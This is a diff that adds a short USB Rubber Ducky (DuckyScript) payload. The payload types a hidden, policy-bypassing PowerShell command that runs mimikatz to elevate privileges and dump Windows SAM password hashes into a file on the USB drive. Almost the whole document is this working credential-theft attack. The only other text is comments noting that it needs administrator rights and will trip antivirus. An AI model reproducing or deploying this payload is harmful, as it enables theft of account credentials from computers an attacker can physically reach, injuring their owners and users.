@@ -1,0 +1,9 @@
+REM Author: Crashwire
+REM Description: Run Mimikatz from USB on D:\ to elevate and extract SAM table hashes (Must have Mimikatz already installed on the rubber ducky)
+REM (NOTE: MUST BE RUN AS ADMINISTRATOR. THIS WILL TRIGGER ANY AV ON THE SYSTEM)
+ATTACKMODE HID STORAGE
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "& D:\mimikatz.exe 'privilege::debug' 'token::elevate' 'lsadump::sam' 'exit' | Out-File -FilePath D:\mimikatz_creds.txt -Encoding ASCII"
+ENTER
